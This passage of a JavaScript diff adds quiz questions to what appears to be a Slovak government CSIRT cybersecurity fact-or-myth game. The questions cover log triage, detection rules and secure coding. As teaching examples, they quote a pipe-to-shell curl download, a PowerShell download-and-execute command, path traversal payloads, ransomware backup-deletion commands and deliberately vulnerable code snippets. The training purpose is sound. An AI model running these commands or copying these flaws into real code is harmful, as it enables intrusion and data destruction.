+          q: "V prípade, že identifikujem podozrivý mail, ktorý by mohol byť phishing, neotváram ho, neklikám naň a zmažem ho, aby sa nešíril a nemohol s ním nik interagovať.",
+          correct: false,
+          e: "Dobrým začiatkom je neotváram, neklikám, nevypĺňam informácie, ale práve vďaka nahláseniu phishingového mailu je možné sa chrániť, lebo kybernetická bezpečnosť sa buduje kolektívnymi vedomosťami, založenými na zodpovednom nahlasovaní.",
+          tip: "Phishing je potrebné nahlásiť svojmu tímu CSIRT podľa dohodnutého postupu."
+        },
+        // 24
+        {
+          q: "Mechanizmus DNS sinkhole môže pomôcť znížiť dopad botnetu tým, že presmeruje komunikáciu na kontrolovaný server.",
+          correct: true,
+          e: "Takzvaný sinkholing vie prerušiť komunikáciu na škodlivé domény a zároveň pomôcť pri identifikácii kompromitovaných zariadení.",
+          tip: "Sinkhole kombinujte s následnou nápravou na koncových zariadeniach a blokovaním trvalého prístupu útočníka."
+        },
+        // 25
+        {
+          q: "Mitre ATT&CK je databáza techník, ktorá pomáha mapovať správanie útočníkov a plánovať detekcie.",
+          correct: true,
+          e: "ATT&CK umožňuje kategorizovať techniky a zhodnotiť pokrytie detekcií alebo použitých opatrení. V CSIRT praxi sa používa aj pri reporte incidentov.",
+          tip: "Mapujte detekcie na ATT&CK a vyhľadávajte medzery v pokrytí bezpečnostným monitoringom."
+        },
+        // 26
+        {
+          q: "Ak organizácia nemá evidenciu aktív (asset inventory), je stále možné spoľahlivo zabezpečiť riadenie zraniteľností (angl. vulnerability management) a riadenie záplat (angl. patch management).",
+          correct: false,
+          e: "Bez inventára organizácie nemôťe vedieť, aké aktíva vlastne má, ktoré aktíva sú exponované a čo treba prioritne chrániť a opravovať. To zvyšuje riziko neoprávneného prístupu na niektorý z kľúčových systémov, zverejnenia citlivých informácií a odstávení systému.",
+          tip: "Nie je to raketová veda, začnite aspoň minimálnym inventárom: verejne dostupné služby, kritické servery a pracovné stanice a na skenovanie perimetra sa pripojte do služby Achilles."
+        },
+        // 27
+        {
+          q: "Phishingové kampane často využívajú legitímne cloud-ové služby na zvýšenie dôveryhodnosti.",
+          correct: true,
+          e: "Útočníci zneužívajú známe platformy na prevádzkovanie návnad alebo škodlivých odkazov, aby obišli reputačné filtre.",
+          tip: "Školte používateľov na overovanie URL, podozrivú komunikáciu nahlasujte a poraďte sa so svojim tímom CSIRT."
+        },
+        // 28
+        {
+          q: "Bezpečnostné oznámenia a varovania VJ CSIRT sú užitočné aj pre plánovanie preventívnych opatrení.",
+          correct: true,
+          e: "Varovania často upozorňujú na aktívne zneužívané zraniteľnosti alebo prebiehajúce kampane. Pomáhajú určiť priority ochrany.",
+          tip: "Zaveďte proces: 1. príjem varovania, 2. posúdenie dopadu, 3. prijatie opatrení, 4. overenie zníženia rizika."
+        },
+        // 29
+        {
+          q: "Služby včasného varovania, napríklad <a href='https://www.csirt.sk/ews' target='_blank'>Systém včasného varovania</a>, (za predpokladu, že ich využíva organizácia zodpovedne) môžu upozorniť na podozrivé aktivity ešte pred úspešným prienikom do systému.",
+          correct: true,
+          e: "Včasné varovanie môže signalizovať riziká, kompromitácie alebo nárast hrozieb. Umožňuje proaktívnu reakciu. Využite <a href='https://www.csirt.sk/katalog' target='_blank'>preventívne služby jednotky CSIRT</a>",
+          tip: "Nastavte kontakty a interné procesy na to, aby varovania nezostali bez reakcie a o prijatých opatreniach informujte jednotku CSIRT."
+        },
+        // 30
+        {
+          q: "Bezpečnostná brána pre e-mail (angl. Email Security Gateway, ESG) dokáže znížiť počet doručných phishingových správ, ale nezaručí 100% ochranu.",
+          correct: true,
+          e: "Aj kvalitné filtre môžu prepustiť určité správy (nové kampane, kompromitované legitímne účty alebo sociálne inžinierstvo). Preto je potrebná kombinácia technických opatrení, školenia používateľov a využívania procesov na nahlasovanie podozrivej aktivity.",
+          tip: "V rámci ESG zapnite aj ochrany, napr. URL rewriting, attachment sandboxing a takisto MFA."
+        }
+      ]
+    },
+    3: {
+      id: 3,
+      title: "Kyberbezpe\u010dnostn\u00e1 hra 3 \u2013 Pokro\u010dil\u00fd | Vl\u00e1dna jednotka CSIRT",
+      brandTitle: "Kyberbezpe\u010dnostn\u00e1 hra 3 \u2013 Pokro\u010dil\u00fd | Vl\u00e1dna jednotka CSIRT",
+      brandSubtitle: "Pokro\u010dil\u00e1 \u00farove\u0148 \u2022 n\u00e1ro\u010dn\u00e9 ot\u00e1zky z praxe CSIRT a princ\u00edpov bezpe\u010dnosti",
+      heroTitle: "Pokro\u010dil\u00e1 \u00farove\u0148: n\u00e1ro\u010dn\u00e9 ot\u00e1zky",
+      heroText: "Kliknite na pol\u00ed\u010dko, rozhodnite, \u010di ide o fakt alebo m\u00fdtus, a zistite spr\u00e1vnu odpove\u010f spolu s vysvetlen\u00edm a odpor\u00fa\u010daniami.",
+      heroLinksHtml: "Vedomosti si m\u00f4\u017ee\u0161 roz\u0161\u00edri\u0165 ako jednotlivec na na\u0161om vedomostnom <a href='https://ctf.kyberakademia.sk/' target='_blank' rel='noopener noreferrer'>port\u00e1li CTF</a> alebo ako t\u00edm v na\u0161om <a href='https://kyberarena.csirt.sk/' target='_blank' rel='noopener noreferrer'>V\u00fdcvikovom a \u0161koliacom stredisku, Kyberar\u00e9na</a>.",
+      hidden: false,
+      questions: [
+        // 1
+        {
+          q: "Auth log: `Accepted publickey for deploy from 10.0.0.128` a o 38 sekúnd neskôr `sudo: deploy : TTY=pts/0 ; COMMAND=/bin/bash`. Bez ďalšieho kontextu to ešte nie je dôkaz kompromitácie.",
+          correct: true,
+          e: "Môže ísť o legitímnu automatizáciu alebo administrátorský zásah. Je to však silná indícia na triáž: pôvodná IP, zvyčajnosť účtu, následné procesy, úpravy súborov a outbound spojenia."
+        },
+        // 2
+        {
+          q: "CLI: `find / -xdev -perm -4000 -type f 2>/dev/null` je vhodný krok pri hardeningu aj triáži, lebo pomáha nájsť Set User ID (SUID) binárne súbory.",
+          correct: true,
+          e: "SUID binárne súbory môžu byť legitímne, ale aj rizikové. Pri incident response alebo hardeningu pomáha zistiť, či nepribudli neštandardné binárky alebo či nie je niektorá z nich zneužiteľná."
+        },
+        // 3
+        {
+          q: "Web log: `POST /api/export?format=../../../../etc/passwd HTTP/1.1` s kódom 400 znamená, že riziko directory traversal je nulové a ďalej to netreba riešiť.",
+          correct: false,
+          e: "Aj neúspešný pokus je cenná indícia. Útočník môže testovať správanie aplikácie a neskôr skúsiť iný parameter, kódovanie alebo cestu. Nejde o dôkaz kompromitácie, ale ide o vhodného kandidáta na koreláciu a tuning detekcie."
+        },
+        // 4
+        {
+          e: "Pri technickej analýze incidentu pomáha, keď organizácia vie rýchlo poskytnúť logy, časové značky, zoznam dotknutých systémov a kontaktnú osobu.",
+          correct: null,
+          tip: "Kvalitná súčinnosť výrazne zrýchľuje triáž a obmedzenie dopadu. VJ CSIRT vie efektívnejšie pomôcť, keď má organizácia pripravené základné artefakty, pozná kritické aktíva a má jasný technický aj eskalačný kontakt."
+        },
+        // 5
+        {
+          q: "Go snippet: `http.FileServer(http.Dir('.'))` za reverzným proxy je automaticky bezpečný, ak reverse proxy zakazuje prístup na cesty začínajúce bodkou.",
+          correct: false,
+          e: "Bezpečnosť nie je len o reverznom proxy. Rozhoduje, aký adresár je zdieľaný, aké sú v ňom súbory, symbolické odkazy (symlinky), artefakty zostavy (angl. build artifacts) a čo sa stane pri chybnej konfigurácii cesty. Proxy pravidlo nestačí ako jediná ochrana."
+        },
+        // 6
+        {
+          q: "Pri porovnávaní dvoch binárnych súborov z incidentu je haš užitočný, ale sám o sebe nehovorí nič o správaní súboru.",
+          correct: true,
+          e: "Haš pomáha pri identifikácii a korelácii artefaktov. Na pochopenie rizika sú však potrebné aj správanie procesu, reťazec spustenia, sieťové spojenia, dôkazy perzistencie a kontext nálezu."
+        },
+        // 7
+        {
+          q: "PHP snippet: `if ($_GET['debug']) { system($_GET['cmd']); }` je v poriadku, ak parameter `debug` používa iba administrátor.",
+          correct: false,
+          e: "Predstavuje to priame riziko vzdialeného spúšťania príkazov. Problém je už samotná existencia takéhoto mechanizmu v produkčnej aplikácii – nielen to, kto ho používa alebo kto ho púšťa."
+        },
+        // 8
+        {
+          q: "IDA / strings výstup z binárky obsahuje postupnosť: `vssadmin Delete Shadows /All /Quiet`, `wbadmin DELETE SYSTEMSTATEBACKUP`, `bcdedit /set {default} recoveryenabled No`. Už samotná táto kombinácia je silná indícia správania typického pre ransomvér alebo wiper.",
+          correct: true,
+          e: "Takáto kombinácia príkazov smeruje k zníženiu možnosti obnovy systému alebo dát po útoku. Nejde ešte o dôkaz úspešnej kompromitácie, ale o veľmi silný indikátor škodlivého zámeru, ktorý treba korelovať s procesovým stromom, časovou osou, perzistenciou a následnými zmenami súborov."
+        },
+        // 9
+        {
+          q: "Zeek DNS záznam: `query=ox3f9a7d1k2.example-cdn.net qtype=A answers=0 rtt=0.001` a podobné náhodne vyzerajúce subdomény sa opakujú každých 5 s. Samotná vysoká entropia názvu ešte nedokazuje DNS tunneling.",
+          correct: true,
+          e: "Je to silná indícia, ale nie dôkaz. Treba pozrieť periodicitu, klienta, objem a typ odpovedí, reputáciu domény a prípadne koreláciu s procesmi alebo sieťovým správaním hosta."
+        },
+        // 10
+        {
+          q: "CLI: `ss -plant` je pri Linux triáži často vhodnejší než starší `netstat`, pretože dáva rýchly prehľad o socketoch a procesoch.",
+          correct: true,
+          e: "`ss` býva dostupný a rýchly. Pri triáži je užitočné vidieť sockety na počúvanie (angl. listening sockets), aktívne spojenia, čísla procesov (angl. proces identifiers, PIDs) a koreláciu s neštandardnými procesmi."
+        },
+        // 11
+        {
+          e: "<a href='https://www.csirt.sk/katalog' target='_blank'>Služby VJ CSIRT</a> dávajú väčší zmysel, keď organizácia priebežne robí prevenciu, nie je pre ňu kybernetická bezpečnosť zaujímavá, len keď už nakupuje technológie alebo rieši incident.",
+          correct: null,
+          tip: "Kombinácia prevencie, monitoringu, testovania a reakcie na incident znižuje čas detekcie aj dopad incidentu. Preto je dôležité využiť služby ešte predtým, než vznikne incident."
+        },
+        // 12
+        {
+          q: "C snippet: `memcpy(dst, src, len);` je bezpečný, `len` ak pochádza z HTTP hlavičky a klientovi dôveruje interný proxy.",
+          correct: false,
+          e: "Zdroj hodnoty nie je zárukou bezpečnosti. Ak `len` nie je validované voči reálnej veľkosti tzv. buffer-u, ide o klasické riziko pretečenia alebo čítania mimo vyhradenú pamäť, ktoré je príčinou mnohých zraniteľností."
+        },
+        // 13
+        {
+          q: "V prístupových logoch (angl. access logs) sa objavuje nasledujúca sekvencia `GET /.git/HEAD`, `GET /.env`, `GET /backup.zip` typicky patrí medzi preskumné techniky (angl. recon), môže ísť o pokusy na únik tajomstiev (angl. secrets) alebo citlivých údajov.",
+          correct: true,
+          e: "Tieto cesty sú bežným cieľom skenovania. Aj keď útok nemusí byť úspešný, je to vhodný kandidát na výstrahu, hardening komponentov a kontrolu, či citlivé súbory neboli omylom publikované, napríklad v rámci zdrojových kódov alebo vo forme citlivých dokumentov."
+        },
+        // 14
+        {
+          q: "Pravidlo typu Sigma / TTP mapovanie: `logsource: product: windows, service: sysmon; detection: selection: EventID: 1, CommandLine|contains: 'rundll32.exe javascript:'; tags: attack.t1218.011, attack.execution` Takýto záznam je rozumné chápať ako detekciu techniky spúšťania cez Signed Binary Proxy Execution, nie ako obyčajný administrátorský detail.",
+          correct: true,
+          e: "Ak pravidlo cieli na Sysmon Event ID 1 (Process Create) a sleduje neštandardný spôsob použitia `rundll32.exe`, ide o relevantnú detekciu TTP, nie len o náhodný detail v logu. Samotné upozornenie však treba potvrdiť kontextom: rodičovský proces, používateľ, host, čas, následná sieťová komunikácia a ďalšie procesy. Ďalšie informácie: <a href='https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon' target='_blank'>Microsoft Sysmon dokumentácia</a>."
+        },
+        // 15
+        {
+          q: "`stat podozrivy_subor` je pri reakcii na incident užitočný, lebo ukáže časové pečiatky, veľkosť, vlastníka a ďalšie metaúdaje súboru.",
+          correct: true,
+          e: "Metaúdaje pomáhajú zaradiť artefakt do časovej osi a spojiť ho s účtom či procesom. Samy osebe však nestačia – je potrebné ich korelovať s logmi a ďalšími stopami."
+        },
+        // 16
+        {
+          q: "Logy doménového radiča (angl. domain controller, DC): `Event ID 4720` (vytvorenie účtu) a o minútu `Event ID 4732` (pridanie do skupiny Administrators) sú silná indícia podozrivej eskalácie oprávnení.",
+          correct: true,
+          e: "Takáto dvojica udalostí, najmä ak ju nespôsobil známy onboarding proces, je vysoko podozrivá. Je potrebné overiť iniciátora, rozsah zmien a súvisiace prihlásenia na DC."
+        },
+        // 17
+        {
+          q: "Ak `git diff` ukáže pridaný riadok `DEBUG=True` v produkčnej konfigurácii, ide len o prevádzkový detail, nie bezpečnostné riziko.",
+          correct: false,
+          e: "Režim ladenia (angl. debug mode) môže otvoriť detailné chyby, diagnostické rozhrania alebo oslabiť bezpečnostné rozhodnutia aplikácie. V produkcii ide o relevantný bezpečnostný nález. Aj náš WordPress hardening manuál odporúča mať v produkcii ladenie vypnuté. Viac info: <a href='https://csirt.sk/wp-content/uploads/2024/07/Wordpress_hardening.pdf' target='_blank'>WordPress hardening manuál</a>."
+        },
+        // 18
+        {
+          e: "Zdieľanie indikátorov kompromitácie má väčšiu hodnotu, ak je doplnené o kontext – čo sa stalo, kde, kedy a s akým dopadom. Takéto detaily sú cenné pre včasnú detekciu hrozieb, napríklad v rámci <a href='https://csirt.sk/ews' target='_blank'>Systému včasného varovania</a> alebo služby <a href='https://csirt.sk/afrodita' target='_blank'>Afrodita</a>",
+          correct: null,
+          tip: "Samotný haš alebo IP adresa bez kontextu má len minimálnu pridanú hodnotu. Pre VJ CSIRT a iné ďalšie organizácie je cennejšie, keď IOC dopĺňa popis správania, čas, cieľ a spôsob detekcie."
+        },
+        // 19
+        {
+          q: "Java snippet: `Runtime.getRuntime().exec(request.getParameter('tool'));` je problémom len vtedy, ak ide o verejný koncový bod (angl. endpoint).",
+          correct: false,
+          e: "Priame spúšťanie príkazov operačného systému z neovereného vstupu je rizikové vždy. Interné rozhrania môžu byť zneužité cez kompromitovanú VPN, SSRF, laterálny pohyb alebo chybu v prístupových pravidlách."
+        },
+        // 20
+        {
+          q: "YARA pravidlo:\n```yara\nrule Suspicious_Ransomware_Behavior {\n  strings:\n    $a = 'vssadmin delete shadows' nocase\n    $b = 'wbadmin delete' nocase\n    $c = 'bcdedit /set' nocase\n  condition:\n    2 of them\n}\n```\nTakéto pravidlo je určené skôr na rýchlu identifikáciu artefaktov alebo vzorov správania spojených s pokusom o zmarenie obnovy odstránením záloh, nie na plnohodnotné vysvetlenie správania útočníka.",
+          correct: true,
+          e: "YARA pravidlo vie pomôcť pri identifikácii súborov alebo artefaktov v operačnej pamäti podľa vzorov, ale sama osebe nevysvetlí celý rozsah incidentu ani reťazec útoku. Pri triáži je to užitočný signál, ktorý treba doplniť logmi, procesmi, časovou osou a sieťovým kontextom. <a href='https://github.com/VirusTotal/yara' target='_blank'>YARA</a> pravidlá ale výrazne pomáhajú pri procese aktívneho vyhľadávania hrozieb (tzv. Threat Hunting)."
+        },
+        // 21
+        {
+          e: "Včasné varovanie a zdieľanie poznatkov je zmysluplné aj vtedy, keď incident neeskaluje do plného výpadku. Na tomto princípe sú postavené služby <a href='https://csirt.sk/ews' target='_blank'>Systému včasného varovania</a> a ďalšie služby <a href='https://csirt.sk/katalog' target='_blank'>VJ CSIRT</a>.",
+          correct: null,
+          tip: "Samozrejme. Aj čiastkové pokusy, skeny a neúspešné exploitácie môžu mať analytickú hodnotu. Pomáhajú napríklad pri úprave monitoringu, procese zabezpečenia (angl. hardening) a môžu pomôcť vytvoriť spoločný obraz o hrozbách."
+        },
+        // 22
+        {
+          q: "JavaScript snippet: `app.get('/redir', (req,res)=>res.redirect(req.query.url))` nepredstavuje riziko, ak len presmeruje používateľa mimo jeho alebo jej domény.",
+          correct: false,
+          e: "Otvorené presmerovanie môže byť zneužité napríklad v rámci phishingu, pri obchádzaní filtrov alebo ako súčasť pokročilejších hrozieb <a href='https://attack.mitre.org/groups/' target='_blank'>(angl. Advanced Persistent Threat, APT)</a>. Bez potrebného zoznamu povolených cieľových domén (angl. allow list) je to bezpečnostný problém."
+        },
+        // 23
+        {
+          q: "Sysmon/PowerShell log: `EventID=4104 ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString(...)` je podozrivý aj bez toho, aby bolo okamžite možné potvrdiť kompromitáciu.",
+          correct: true,
+          e: "Je to typický kandidát na hlbšiu triáž: overiť rodičovský proces, používateľa, cieľ komunikácie, následné spustenia a artefakty na disku. Samotný log nie je celý príbeh, ale rozhodne nie je benígny."
+        },
+        // 24
+        {
+          q: "Ak Web Application Firewall (WAF) blokuje užitočný obsah (tzv. payload) a aplikácia je ukrytá za VPN, netreba už riešiť nie bezpečné nahrávanie súborov (angl. insecure file upload), lebo cesta k zneužitiu je dostatočne obmedzená.",
+          correct: false,
+          e: "WAF ani VPN nenahrádzajú bezpečný návrh aplikácia a nahrávania súborov. Nesprávna validácia typu, prípony, obsahu, umiestnenia súboru, kontrola na prítomnosť škodlivého kódu a oprávnení môže byť zneužiteľná aj z interného priestoru."
+        },
+        // 25
+        {
+          q: "Shell história: `chmod 4755 /tmp/.sys` predstavuje silnú indíciu pokusu o lokálnu eskaláciu oprávnení alebo perzistenciu.",
+          correct: true,
+          e: "Nastavenie Set User ID (SUID) na podozrivý binárny súbor v dočasnom adresári je veľmi podozrivé. Je to vhodný kandidát na okamžitú izoláciu systému a hlbšiu analýzu."
+        },
+        // 26
+        {
+          q: "Python snippet: `pickle.loads(base64.b64decode(data))` je v poriadku, ak dáta posiela iba interná služba Vašej organizácie.",
+          correct: false,
+          e: "Nedôveryhodná deserializácia je riziko aj v internom prostredí. Interný systém môže byť kompromitovaný alebo zneužitý cez laterálny pohyb. Deserializácia musí byť bezpečná z princípu. Viac info: <a href='https://portswigger.net/web-security/deserialization' target='_blank'>PortSwigger – insecure deserialization</a>."
+        },
+        // 27
+        {
+          q: "QRadar offense: `Magnitude: High`, zdrojové IP sú za Network Address Translation (NAT), pravidlo sa spustilo na základe viacerých udalostí `Multiple Failed Logons followed by Successful Logon`, ale analytik koreluje iba podľa zdrojovej IP adreesy. Takýto záver môže byť zavádzajúci a bez používateľa, zariadenia a času nemusí systém správne identifikovať skutočný účet alebo zariadenie.",
+          correct: true,
+          e: "Samotná IP adresa často nestačí, najmä ak je schovaná za NAT, proxy alebo terminálovým serverom. Pri vyšetrovaní tzv. offense (výstraha v terminológií QRadar IBM) treba korelovať aj používateľa, hostname, cieľový systém, časové okno, typ autentifikácie a ďalšie súvisiace udalosti, inak môže byť offense síce technicky správny, ale analyticky zavádzajúci."
+        },
+        // 28
+        {
+          q: "WordPress config snippet: `define('WP_DEBUG', true); define('WP_DEBUG_DISPLAY', true);` je v produkcii prijateľný, ak je `/wp-admin` chránený VPN.",
+          correct: false,
+          e: "Ani ochrana administrácie VPN neospravedlňuje zapnutie ladiaceho režimu v produkcii. Chybové výpisy môžu odhaliť cesty, verzie doplnkov (angl. plugins), databázové chyby a ďalšie interné detaily. WordPress hardening manuál od VJ CSIRT odporúča mať režim ladenia v produkcii vypnutý. Viac info: <a href='https://csirt.sk/wp-content/uploads/2024/07/Wordpress_hardening.pdf' target='_blank'>WordPress hardening manuál</a>."
+        },
+        // 29
+        {
+          q: "Windows log (kanál Security): séria `Event ID 4625 (Logon Type 3)` z viacerých IP na účet `admin` v krátkom čase je silná indícia kampane využívajúcej útok hrubou silou, aj keď zatiaľ systém nezachytil úspešné prihlásenie `Event ID 4624`.",
+          correct: true,
+          e: "Neúspešné sieťové prihlásenia z viacerých zdrojov v krátkom intervale sú samy o sebe relevantný detekčný signál. Aj bez úspešného prihlásenia ide o udalosť hodnú reakcie, tuningu alebo ďalšieho vyšetrovania."
+        },
+        // 30
+        {
+          q: "Kód v PHP:\n```php\n<?php\n$template = $_GET['view'] ?? 'home';\ninclude 'pages/' . $template . '.php';\n```\nTáto ukážka kódu predstavuje riziko typu Local File Inclusion / Path Traversal, ak vstup nie je striktne obmedzený na bezpečný zoznam hodnôt.",
+          correct: true,
+          e: "Ak aplikácia skladá cestu k súboru z používateľského vstupu bez pevného zoznamu povolených hodnôt (angl. allow list), útočník môže skúšať načítanie neplánovaných súborov alebo manipuláciu s cestou. Presný dopad závisí od validácie, normalizácie ciest, konfigurácie PHP a dostupných súborov v prostredí. Ďalšie informácie: <a href='https://portswigger.net/web-security/file-path-traversal' target='_blank'>PortSwigger – Path traversal</a>."
+        }
+      ]
+    },
+    4: {
+      id: 4,
+      title: "Kyberbezpečnostná hra 4 – Špecializovaná | Vládna jednotka CSIRT",
+      brandTitle: "Kyberbezpečnostná hra 4 – Špecializovaná | Vládna jednotka CSIRT",
+      brandSubtitle: "Úroveň 4 • Skrytá úroveň VJ CSIRT",
+      heroTitle: "Úroveň 4: logy, kód a náročné scenáre",
+      heroText: "Kliknite na políčko, rozhodnite, či ide o fakt alebo mýtus, a zistite správnu odpoveď spolu s vysvetlením a odporúčaniami.",
+      heroLinksHtml: "Vedomosti si môžeš rozšíriť ako jednotlivec na našom vedomostnom <a href='https://ctf.kyberakademia.sk/' target='_blank' rel='noopener noreferrer'>portáli CTF</a> alebo ako tím v našom <a href='https://kyberarena.csirt.sk/' target='_blank' rel='noopener noreferrer'>Výcvikovom a školiacom stredisku, Kyberaréna</a>.",
+      hidden: true,
+      questions: [
+        // 1
+        {
+          q: "V logu SSH je riadok: `Failed password for invalid user admin from 203.0.113.9 port 51234 ssh2`. Nemusí ešte ísť o kybernetický bezpečnostný incident (KBI) – môže ísť o bežnú premávku z internetu.",
+          correct: true,
+          e: "Je to typický prejav automatizovaných pokusov o prihlasovanie (internetový šum). Incident to býva až vtedy, keď vidíte úspešné prihlásenie, opakované pokusy o prienik na konkrétny účet/host, nárast objemu, alebo následné podozrivé aktivity.",
+          tip: "Je potrebné sledovať, či sa neobjaví aj 'Accepted password' alebo neôjde k zmene konfigurácie SSH."
+        },
+        // 2
+        {
+          q: "Príkaz `sudo last -a | head` je užitočný pri rýchlej triáži kompromitácie Linux servera.",
+          correct: true,
+          e: `\`last\` ukáže históriu prihlásení (vrátane IP s -a). Pri triáži je takto možné overiť, či sa nedošlo k prihláseniu v nezvyčajnom čase alebo z neznámych IP adries. Tento výstup je vždy potrebné kombinovať s audit logmi alebo aplikačnými logmi.`
+        },
+        // 3
+        {
+          q: "V rámci analýzy prístupového logu (angl. access log) webu je možné pozorovať opakované požiadavky na `/wp-admin/` a `/xmlrpc.php`, je isté, že server bol kompromitovaný.",
+          correct: false,
+          e: "Skenovanie a pokusy o zneužitie sú veľmi bežné. Kompromitáciu naznačí až úspešná zmena stavu, napr. došlo k nahratiu tzv. web shell, boli vytvorené nové účty, došlo k zmenám súborov, v operačnej pamäti sa objavili neštandardné procesy, odchádzajúce spojenia, anomálie v rámci databázy alebo iné indikátory kompromitácie."
+        },
+        // 4
+        {
+          e: "Ak ste subjekt verejnej správy a evidujete bezpečnostný incident, máte povinnosť ho nahlásiť aj vtedy, keď nepotrebujete súčinnosť. Nahlasovanie incidentov pomáha koordinácii a zdieľaniu poznatkov. Postup a kontakt nájdete na stránke <a href='https://csirt.sk/incident' target='_blank'>Nahlásiť incident</a>",
+          correct: null,
+        },
+        // 5
+        {
+          q: "V logu pre nginx bol identifikovaný nasledujúci záznam: `'GET /index.php?file=../../../../etc/passwd HTTP/1.1' 200`. Je to silná indícia pokusu o Local File Inclusion / Path Traversal.",
+          correct: true,
+          e: `Vzory ako \`../\` a prístup k citlivým súborom (\`/etc/passwd\`) sú typické pre tzv. Path Traversal alebo Local File Inclusion (LFI). Dôležité je overiť, čo aplikácia reálne vrátila (veľkosť odpovede alebo obsah) a či útočník následne eskaloval, napr. došlo k vzdialenému vykonaniu kódu (angl. remote code execution, RCE).`,
+          tip: "Pozrite veľkosť odpovede a či sa objavujú následné požiadavky na nahrávanie alebo /proc/self/environ."
+        },
+        // 6
+        {
+          q: "V histórii bash sa objavil záznam `curl http://x.x.x.x/s.sh | sh`. Môžeme túto aktivitu označiť za legitímnu.",
+          correct: false,
+          e: "Takzvaný piping do shellu je častá technika pre malvér typu dropper. Overte sieťové spojenia, stiahnite súbory, vytvorte nové služby / systemd unit, sledujte či nepribudli nové úlohy v rámci crontab, a sledujte aj anomálie v procesoch.",
+          tip: "Skontrolujte crontab (`crontab -l`, `/etc/cron.*`) a systemd (`systemctl list-timers`, unit súbory)."
+        },
+        // 7
+        {
+          q: "Kód: `printf(user_input);` je bezpečný, ak je program spustený bez oprávnení superpoužívateľa.",
+          correct: false,
+          e: "Ide o tzv. <a href='https://owasp.org/www-community/attacks/Format_string_attack' target='_blank'>Format String Vulnerability</a> – môže viesť k úniku pamäte, zápisu do pamäte a potenciálne k vykonaniu kódu. Nezávisí to len od oprávnení, ale aj od možnosti zneužiť proces a možnosti zvýšenia oprávnení"
+        },
+        // 8
+        {
+          q: "V logoch Windows Security sa nachádza `Event ID 4625` vo veľkom objeme. Samotné `Event ID 4625` nestačí na potvrdenie prieniku.",
+          correct: true,
+          e: "Identifikátor udalosti `Event ID 4625` znamená neúspešný pokus o prihlásenie (angl. failed logon). Pre potvrdenie úspešného prieniku je potrebné hľadať `Event ID 4624 (successful logon)`, anomálne typy logon, vytvorenie nových účtov/skupiny, zmeny v skupinovej politike, a laterálne pohyby po sieti."
+        },
+        // 9
+        {
+          q: "Príkaz `netstat -plant` je vhodný na rýchle zistenie, ktoré procesy počúvajú na portoch.",
+          correct: true,
+          e: `\`-p\` mapuje PID/program, \`-l\` listening, \`-a\` všetko. V triáži rýchlo uvidíte neočakávané listenery alebo odchádzajúce (angl. outbound) spojenia (kombinujte aj s \`ss -plant\`).`
+        },
+        // 10
+        {
+          q: "Ak sa v logu DNS nachádza veľa dopytov na náhodne vyzerajúce subdomény (napr. `n3p0kus4js4m4c1t4tk3ds1zn3usr[.]example[.]com`), môže ísť o tzv. DGA alebo DNS tunneling.",
+          correct: true,
+          e: "Strojovo generované subdomény a vysoká entropia sú typické pre Domain Generation Algorithm (DGA) alebo tunelovanie. Overte komunikáciu smerujúce z klienta, periodicitu, veľkosť odpovedí a koreláciu s inými indikátormi.",
+          tip: "Pomôže entropia subdomén a korelácia s jedným hostom (IP adresa klienta)."
+        },
+        // 11
+        {
+          e: "Ak si sa dostal až sem a baví ťa učiť sa nové veci súvisiace s kybernetickou bezpečnostou, príď si k nám zahrať <a href='https://kyberarena.csirt.sk/' target='_blank'>do Kyberarény</a> a otestuj svoje vedomosti na scenároch inšpirovaných skutočnými udalosťami.",
+          correct: null,
+          tip: "#inspiredbytrueevents"
+        },
+        // 12
+        {
+          q: "Kód: `strcpy(buf, argv[1]);` je použitá bezpečne, ak predtým skontrolujem `strlen(argv[1]) < sizeof(buf)`.",
+          correct: false,
+          e: "Aj s kontrolou dĺžky vznikajú časté chyby (napr. rozdiel medzi \`sizeof\` a reálnou kapacitou). Bezpečnejšie je používať tzv. viazané (angl. bounded) funkcie a jasné rozhranie aplikačné programové rozhranie (angl. Application Programming Interface, API), napr. \`snprintf\`, \`strlcpy\` ak je to možné a vykonať tzv. hardening (Address Space Layout Randomization - ASLR - alebo stack canary)."
+        },
+        // 13
+        {
+          q: "Ak útočník získa prístup do koreňového adresára webu (angl. webroot), často sa snaží o perzistenciu cez tzv. `crontab`, služby `systemd` alebo mechanizmy autorun.",
+          correct: true,
+          e: "Perzistencia je typická cez: cron, systemd časovače (angl. timers) alebo služby (angl. services), rc.local, init skripty, webshell v statických súboroch, alebo zneužité Continuous Integration  / Continuous Development (CI/CD). V rámci reakcie na incidenty kontrolujte napríklad aj tieto miesta."
+        },
+        // 14
+        {
+          q: "V zázname o udalostiach aplikácie Apache je záznam `POST /upload` a krátko potom sa objaví nový súbor `shell.php`. To je typická stopa zneužitia mechanizmu nahrávania.",
+          correct: true,
+          e: "Korelujte čas nahrávania súboru koncového zariadenia, kód odpovede, identifikátor použitého agenta (angl. user-agent), zdrojovú IP adresu požiadavky a zmeny na disku. Skontrolujte aj validáciu pre MIME, kontrolu prípon aj na strane servera (angl. server-side) a ukladanie súborov mimo koreňový adresár webu (angl. webroot).",
+          tip: "Nahrávaný súbor ukladajte výhradne do dedikovaného priečinka a validujte obsah (magic bytes), nie len príponu."
+        },
+        // 15
+        {
+          q: "Príkaz `journalctl --since '1 hour ago'` je vhodný na rýchly prehľad systémových udalostí.",
+          correct: true,
+          e: `Je to rýchly spôsob, ako získať vybraný časový úsek logov pre triáž. Je možné ho doplniť o filtre (\`-u service\`, \`-p err\`) a export záznamov.`
+        },
+        // 16
+        {
+          q: "V rámci analýzy logov sa objaví záznam `sudo: user : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/bash`, to vždy indikuje škodlivú činnosť.",
+          correct: false,
+          e: "Môže ísť o legitímnu aktivitu administráciu (napr. cez automatizáciu). Je to však silný signál na overenie kontextu: kto, kedy, odkiaľ, prečo, a čo nasledovalo."
+        },
+        // 17
+        {
+          q: "Kód v PHP: `include($_GET['page'] . '.php');` bez zoznamu povolených položiek (angl. allowlist) môže viesť k LFI / RFI.",
+          correct: true,
+          e: "Bez tzv. allowlist a normalizácie vstupu ide o to typický útok Local File Inclusion (LFI) / Remote File Inclusion (RFI). Útočník môže skúšať metódu path traversal, využiť wrappery (napr. `php://`), alebo RFI (ak je povolené)."
+        },
+        // 18
+        {
+          q: "Ak firewall zaznamenáva veľa odchádzajúcich spojení na neobvyklé porty, nie je to problém, pokiaľ je daný port pre prichádzajúce spojenia zatvorený.",
+          correct: false,
